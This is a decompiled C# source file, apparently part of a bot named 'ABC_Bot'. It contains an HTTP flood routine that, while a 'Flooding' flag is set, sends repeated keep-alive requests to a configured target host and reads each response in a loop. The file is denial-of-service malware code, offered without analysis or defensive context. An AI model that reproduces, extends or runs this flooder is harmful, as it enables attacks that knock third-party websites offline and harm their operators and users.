using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using Microsoft.VisualBasic.CompilerServices;

namespace ABC_Bot;

public class c_http
{
	public static bool Flooding = false;

	public static string host;

	[DebuggerNonUserCode]
	public c_http()
	{
	}

	public static object http()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		Stream responseStream = default(Stream);
		byte[] array = default(byte[]);
		HttpWebRequest httpWebRequest = default(HttpWebRequest);
		HttpWebResponse httpWebResponse = default(HttpWebResponse);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 220:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 5:
							goto IL_0014;
						case 6:
							goto IL_0027;
						case 7:
							goto IL_0031;
						case 8:
							goto IL_0041;
						case 9:
							goto IL_004d;
						case 10:
							goto IL_0053;
						case 13:
							goto IL_0064;
						case 11:
						case 12:
							goto IL_006c;
						case 3:
						case 4:
						case 14:
							goto IL_007f;
						default:
							goto end_IL_0000;
						case 15:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_0064:
					num = 13;
					if (num5 > 0)
					{
						goto IL_006c;
					}
					goto IL_007f;
					IL_006c:
					num = 12;
					num5 = responseStream.Read(array, 0, array.Length);
					goto IL_0064;
					IL_0009:
					num = 2;
					ServicePointManager.Expect100Continue = false;
					goto IL_007f;
					IL_007f:
					num = 4;
					if (!Flooding)
					{
						goto end_IL_0000_2;
					}
					goto IL_0014;
					IL_0014:
					num = 5;
					httpWebRequest = (HttpWebRequest)WebRequest.Create(host);
					goto IL_0027;
					IL_0027:
					num = 6;
					httpWebRequest.KeepAlive = true;
					goto IL_0031;
					IL_0031:
					num = 7;
					httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
					goto IL_0041;
					IL_0041:
					num = 8;
					responseStream = httpWebResponse.GetResponseStream();
					goto IL_004d;
					IL_004d:
					num = 9;
					num5 = 0;
					goto IL_0053;
					IL_0053:
					num = 10;
					array = new byte[8192];
					goto IL_006c;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 220;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		object result = default(object);
		return result;
	}
}
